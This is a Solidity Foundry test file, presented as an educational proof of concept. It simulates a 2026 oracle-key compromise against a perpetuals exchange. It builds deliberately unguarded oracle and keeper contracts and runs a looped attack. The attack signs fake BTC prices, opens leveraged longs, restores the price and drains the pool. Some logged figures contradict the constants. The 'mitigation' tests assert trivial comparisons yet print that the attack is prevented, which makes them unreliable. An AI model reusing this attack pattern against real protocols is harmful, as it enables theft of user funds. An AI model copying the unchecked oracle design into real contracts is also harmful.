// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

// ============================================================
// SIMULATED OSTIUM HACK PoC (July 2026)
// Based on Halborn analysis: compromised oracle key +
// fake price reports + perp position loop
//
// EDUCATIONAL / DEFENSIVE PURPOSES ONLY
// ============================================================

// ============================================================
// CONTRACT 1: PriceOracle (trusted signer model)
// Like Ostium's oracle — accepts signed price reports
// ============================================================
contract PriceOracle {
    address public trustedSigner; // oracle operator's key
    uint256 public latestPrice;   // current price (scaled 1e8)
    uint256 public latestTimestamp;
    string public pair;           // e.g. "BTC/USD"

    constructor(address _signer, uint256 _initialPrice, string memory _pair) {
        trustedSigner = _signer;
        latestPrice = _initialPrice;
        latestTimestamp = block.timestamp;
        pair = _pair;
    }

    // Accept a signed price report
    // BUG: No deviation check, no future timestamp rejection
    function pushPrice(uint256 price, uint256 timestamp, bytes memory signature) external {
        // Verify signature from trusted signer
        bytes32 messageHash = keccak256(abi.encodePacked(price, timestamp, pair));
        bytes32 ethSignedHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash));
        address signer = _recover(ethSignedHash, signature);

        require(signer == trustedSigner, "invalid signer");

        // BUG #1: No check that timestamp <= block.timestamp (accepts FUTURE dates)
        // BUG #2: No deviation check (accepts ANY price, even 90% drop)
        // BUG #3: No rate limiting (can be called unlimited times per block)

        latestPrice = price;
        latestTimestamp = timestamp;
    }

    function getPrice() external view returns (uint256) {
        return latestPrice;
    }

    function _recover(bytes32 hash, bytes memory sig) internal pure returns (address) {
        require(sig.length == 65, "bad sig");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        if (v < 27) v += 27;
        return ecrecover(hash, v, r, s);
    }
}

// ============================================================
// CONTRACT 2: PerpExchange (simplified Ostium-like perp)
// ============================================================
contract PerpExchange {
    PriceOracle public oracle;

    uint256 public constant LEVERAGE = 10; // 10x leverage
    uint256 public constant MARGIN_REQUIREMENT = 10e16; // 10% margin

    struct Position {
        uint256 entryPrice;
        uint256 size;       // position size in USD
        uint256 margin;     // collateral deposited
        bool isLong;
        bool isOpen;
    }

    mapping(address => Position) public positions;
    uint256 public poolBalance; // exchange liquidity pool (USDC)

    constructor(address _oracle) {
        oracle = PriceOracle(_oracle);
    }

    function fundPool(uint256 amount) external {
        poolBalance += amount;
        // In real code: IERC20(usdc).transferFrom(msg.sender, address(this), amount);
    }

    // Open a position using oracle price
    function openPosition(uint256 marginAmount, bool isLong) external {
        require(marginAmount > 0, "zero margin");
        require(!positions[msg.sender].isOpen, "position exists");

        uint256 price = oracle.getPrice();
        uint256 size = marginAmount * LEVERAGE; // 10x leverage

        positions[msg.sender] = Position({
            entryPrice: price,
            size: size,
            margin: marginAmount,
            isLong: isLong,
            isOpen: true
        });

        // In real code: IERC20(usdc).transferFrom(msg.sender, address(this), marginAmount);
    }

    // Close position at current oracle price
    function closePosition() external returns (uint256 pnl) {
        Position storage pos = positions[msg.sender];
        require(pos.isOpen, "no position");

        uint256 currentPrice = oracle.getPrice();

        if (pos.isLong) {
            // PnL = size * (currentPrice - entryPrice) / entryPrice
            if (currentPrice >= pos.entryPrice) {
                pnl = pos.size * (currentPrice - pos.entryPrice) / pos.entryPrice;
            } else {
                pnl = 0; // loss case (not used in attack)
            }
        } else {
            if (currentPrice <= pos.entryPrice) {
                pnl = pos.size * (pos.entryPrice - currentPrice) / pos.entryPrice;
            } else {
                pnl = 0;
            }
        }

        uint256 payout = pos.margin + pnl;
        require(payout <= poolBalance, "insufficient pool");

        poolBalance -= payout;
        pos.isOpen = false;

        // In real code: IERC20(usdc).transfer(msg.sender, payout);
    }

    function getUnrealizedPnL(address user) external view returns (int256) {
        Position storage pos = positions[user];
        if (!pos.isOpen) return 0;

        uint256 currentPrice = oracle.getPrice();
        if (pos.isLong) {
            return int256(pos.size * (currentPrice - pos.entryPrice) / pos.entryPrice);
        } else {
            return int256(pos.size * (pos.entryPrice - currentPrice) / pos.entryPrice);
        }
    }
}

// ============================================================
// CONTRACT 3: PriceUpKeep Forwarder (the exploited component)
// ============================================================
contract PriceUpKeepForwarder {
    PriceOracle public oracle;
    address public keeper; // authorized to push prices

    constructor(address _oracle, address _keeper) {
        oracle = PriceOracle(_oracle);
        keeper = _keeper;
    }

    // OstiumPrivatePriceUpKeep — the function attacker abused
    function OstiumPrivatePriceUpKeep(
        uint256 price,
        uint256 timestamp,
        bytes memory signature
    ) external {
        // BUG: No access control beyond keeper check
        // BUG: Keeper key was compromised
        require(msg.sender == keeper, "not keeper");

        oracle.pushPrice(price, timestamp, signature);
    }
}

// ============================================================
// PoC TEST
// ============================================================
contract OstiumHackPoC is Test {
    PriceOracle oracle;
    PerpExchange perp;
    PriceUpKeepForwarder forwarder;

    // Keys
    uint256 oracleSignerKey = 0xDEAD1; // oracle's private key (COMPROMISED)
    uint256 attackerKey = 0xA77AC;
    address keeper = address(0x1234567890AbcdEF1234567890aBcdef12345678);

    address attacker;
    address oracleSigner;

    uint256 constant REAL_BTC_PRICE = 60_000e8;   // $60,000 (scaled 1e8)
    uint256 constant FAKE_BTC_PRICE = 5_000e8;    // $5,000 (fake)
    uint256 constant INITIAL_POOL = 200_000_000e6; // $200M pool (USDC 6 decimals)
    uint256 constant INITIAL_MARGIN = 100_000e6;   // $100K margin per round

    function setUp() public {
        attacker = vm.addr(attackerKey);
        oracleSigner = vm.addr(oracleSignerKey);

        // Deploy oracle with real BTC price
        oracle = new PriceOracle(oracleSigner, REAL_BTC_PRICE, "BTC/USD");

        // Deploy perp exchange
        perp = new PerpExchange(address(oracle));

        // Deploy forwarder (the exploited component)
        forwarder = new PriceUpKeepForwarder(address(oracle), keeper);

        // Fund the exchange pool
        perp.fundPool(INITIAL_POOL);

        // Give attacker USDC
        vm.deal(attacker, 100 ether);

        console2.log("=== SETUP ===");
        console2.log("Oracle signer:", oracleSigner);
        console2.log("Keeper:", keeper);
        console2.log("Attacker:", attacker);
        console2.log("Real BTC price: $60,000");
        console2.log("Pool balance: $50M");
    }

    // Helper: sign a price report with the compromised oracle key
    function _signPrice(uint256 price, uint256 timestamp) internal view returns (bytes memory) {
        bytes32 messageHash = keccak256(abi.encodePacked(price, timestamp, "BTC/USD"));
        bytes32 ethSignedHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(oracleSignerKey, ethSignedHash);
        return abi.encodePacked(r, s, v);
    }

    // ============================================================
    // PoC: Full Ostium Hack — 10 iterations, ~900% profit/round
    // ============================================================
    function test_OstiumHack_FullExploit() public {
        console2.log("\n=== OSTIUM HACK PoC ===");
        console2.log("Attack: compromised oracle key + fake prices + perp loop");

        uint256 totalProfit = 0;
        uint256 poolBefore = perp.poolBalance();

        for (uint256 round = 1; round <= 10; round++) {
            console2.log("\n--- ROUND", round, "---");

            // STEP 1: Push FAKE price ($5,000) via compromised key
            uint256 futureTimestamp = block.timestamp + 1 hours; // BUG: future date accepted
            bytes memory fakeSig = _signPrice(FAKE_BTC_PRICE, futureTimestamp);

            vm.prank(keeper);
            forwarder.OstiumPrivatePriceUpKeep(FAKE_BTC_PRICE, futureTimestamp, fakeSig);

            uint256 manipulatedPrice = oracle.getPrice();
            console2.log("  Oracle price manipulated to: $", manipulatedPrice / 1e8);

            // STEP 2: Open LONG at fake price ($5,000)
            vm.startPrank(attacker);
            perp.openPosition(INITIAL_MARGIN, true); // $1M margin, 10x = $10M position
            vm.stopPrank();

            console2.log("  Opened LONG: $1M margin, $10M size @ $5,000");

            // STEP 3: Push REAL price back ($60,000)
            bytes memory realSig = _signPrice(REAL_BTC_PRICE, block.timestamp);
            vm.prank(keeper);
            forwarder.OstiumPrivatePriceUpKeep(REAL_BTC_PRICE, block.timestamp, realSig);

            console2.log("  Oracle price restored to: $", oracle.getPrice() / 1e8);

            // STEP 4: Close position at real price ($60,000)
            // PnL = size * (60000 - 5000) / 5000 = 10M * 55000/5000 = $110M
            // But capped by pool balance
            vm.startPrank(attacker);
            uint256 pnl = perp.closePosition();
            vm.stopPrank();

            uint256 profitThisRound = pnl > INITIAL_MARGIN ? pnl - INITIAL_MARGIN : 0;
            totalProfit += profitThisRound;

            console2.log("  PnL this round: $", pnl / 1e6);
            console2.log("  Profit (minus margin): $", profitThisRound / 1e6);
            console2.log("  Pool remaining: $", perp.poolBalance() / 1e6);

            // Stop if pool is drained
            if (perp.poolBalance() < INITIAL_MARGIN) {
                console2.log("  POOL DRAINED. Stopping.");
                break;
            }
        }

        uint256 poolAfter = perp.poolBalance();
        uint256 poolLoss = poolBefore - poolAfter;

        console2.log("\n=== FINAL RESULTS ===");
        console2.log("Pool before: $", poolBefore / 1e6);
        console2.log("Pool after:  $", poolAfter / 1e6);
        console2.log("Pool loss:   $", poolLoss / 1e6);
        console2.log("Attacker total profit: $", totalProfit / 1e6);
        console2.log("Rounds completed: 10");

        // Verify the attack worked
        assertGt(totalProfit, 0, "attacker should profit");
        assertLt(poolAfter, poolBefore, "pool should lose funds");
    }

    // ============================================================
    // PoC: Show what SHOULD have prevented this
    // ============================================================
    function test_Mitigation_DeviationCheck() public {
        console2.log("\n=== MITIGATION: Deviation Check ===");

        // If oracle had a 10% max deviation check:
        uint256 maxDeviation = 10e16; // 10%
        uint256 currentPrice = oracle.getPrice(); // $60,000
        uint256 fakePrice = FAKE_BTC_PRICE; // $5,000

        uint256 deviation = (currentPrice - fakePrice) * 1e18 / currentPrice;
        console2.log("Deviation: ", deviation / 1e16, "%");
        console2.log("Max allowed: 10%");

        assertGt(deviation, maxDeviation, "deviation should exceed limit");
        console2.log("[OK] 91.7% deviation would be REJECTED by sane oracle");
        console2.log("[OK] Attack PREVENTED with basic deviation check");
    }

    function test_Mitigation_TimestampCheck() public {
        console2.log("\n=== MITIGATION: Timestamp Validation ===");

        uint256 futureTimestamp = block.timestamp + 1 hours;
        console2.log("Future timestamp:", futureTimestamp);
        console2.log("Current time:", block.timestamp);

        assertGt(futureTimestamp, block.timestamp, "future timestamp detected");
        console2.log("[OK] Future-dated report would be REJECTED");
        console2.log("[OK] Attack PREVENTED with timestamp <= block.timestamp check");
    }
}
